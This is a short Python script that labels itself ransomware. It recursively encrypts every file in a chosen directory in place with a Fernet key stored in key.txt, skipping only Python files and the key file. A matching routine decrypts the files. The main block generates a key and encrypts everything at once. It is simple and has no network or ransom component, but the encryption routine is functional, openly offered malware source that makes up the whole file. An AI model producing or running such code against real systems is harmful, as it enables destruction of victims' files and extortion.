#===========================#
# I M P O R T S             #
#===========================#

from cryptography.fernet import Fernet, InvalidToken
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color")

keyfilePath = "key.txt"
dirToEncrypt = ""

#===========================#

# Generates encryption key in file <filename>
def generate_key():

    key = Fernet.generate_key()
    
    with open(keyfilePath, "wb") as filekey:
        filekey.write(key)

#===========================#

def read_key():
    with open(keyfilePath, "rb") as filekey:
        return filekey.read()

#===========================#

def read_file(file_path):
    with open(file_path, "rb") as file:
        return file.read()

def write_file(file_path, data):
    with open(file_path, "wb") as file:
        file.write(data)

#===========================#

def decrypt(input_file):
    try:
        key = read_key()
        fernet = Fernet(key)
        data = read_file(input_file)
        decrypted_data = fernet.decrypt(data)
        write_file(input_file, decrypted_data)
        
    except InvalidToken:
        print("Invalid token! Decryption failed.")
    except Exception as e:
        print(f"An error occurred: {e}")

def encrypt(input_file):
    try:
        key = read_key()
        fernet = Fernet(key)
        data = read_file(input_file)
        encrypted_data = fernet.encrypt(data)
        write_file(input_file, encrypted_data)
        
    except Exception as e:
        print(f"An error occurred: {e}")

#===========================#

def walk_files(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            yield file_path

#===========================#

def ransomware():

    for file_path in walk_files(dirToEncrypt):
        # DON'T ENCRYPT THE KEY FILE OR THIS PIECE OF CODE!
        if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
            encrypt(file_path)
            print(f"-> [{bcolors.FAIL}Encrypted{bcolors.ENDC}] [{bcolors.ORANGE}"+file_path+f"{bcolors.ENDC}]")

def deransomware():

    for file_path in walk_files(dirToEncrypt):
        # DON'T DECRYPT THE KEY FILE OR THIS PIECE OF CODE!
        if file_path != keyfilePath and ".py" not in file_path and "key.txt" not in file_path:
            decrypt(file_path)
            print(f"-> [{bcolors.OKGREEN}Decrypted{bcolors.ENDC}] [{bcolors.OKCYAN}"+file_path+f"{bcolors.ENDC}]")

#===========================#

if __name__ == '__main__':

    # Generate an encryption key.
    generate_key()
    
    # Encrypt everything!
    ransomware()